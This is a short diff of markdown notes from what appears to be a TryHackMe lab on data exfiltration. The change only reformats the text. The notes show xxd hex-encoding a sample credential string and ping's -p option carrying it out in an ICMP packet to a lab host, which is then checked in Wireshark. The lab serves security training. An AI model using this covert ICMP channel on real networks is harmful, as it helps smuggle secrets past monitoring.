@@ -46,9 +46,12 @@ root@AttackBox$ echo "thm:tryhackme" | xxd -p 74686d3a7472796861636b6d650a
 <br><br>
 We used the **`xxd`** command to convert our string to Hex, and then we can use the **`ping`** command with the Hex value we got from converting the **`thm:tryhackme`**.
 
-Send Hex using the ping command.
+```bash
+#Send Hex using the ping command:
 root@AttackBox$ ping 10.10.144.103 -c 1 -p 74686d3a7472796861636b6d650a
-We sent one ICMP packet using the ping command with thm:tryhackme Data. Let's look at the Data section for this packet in the Wireshark.
+```
+<br>
+We sent one ICMP packet using the ping command with **`thm:tryhackme`** Data. Let's look at the Data section for this packet in the Wireshark.
 
 Checking Data Field in Wireshark
 
